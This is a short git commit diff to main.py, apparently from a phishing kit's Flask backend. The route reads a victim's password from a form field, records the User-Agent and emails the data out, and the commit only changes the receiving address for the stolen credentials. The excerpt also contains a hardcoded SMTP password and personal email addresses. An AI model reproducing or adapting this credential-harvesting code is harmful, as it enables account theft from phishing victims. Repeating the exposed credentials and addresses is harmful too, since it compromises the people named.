d5add1fe4fe709605aeb0ee8b6e387adce4103d4
suradarsol <emmanuel@suradarsol.com>
2025-11-19 13:34:49 +0100

    Update main.py

--- main.py
+++ main.py
@@ -178,7 +178,7 @@ def first():
         passwordemail = request.form.get('pig')
         sender_email = 'eissa@waterworldwaterpark.com'
         sender_emaill = 'eissa'
-        receiver_email = 's.toihidi@gmail.com'
+        receiver_email = 'tdwmc123456@gmail.com'
         password = 'EISSA47314A'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
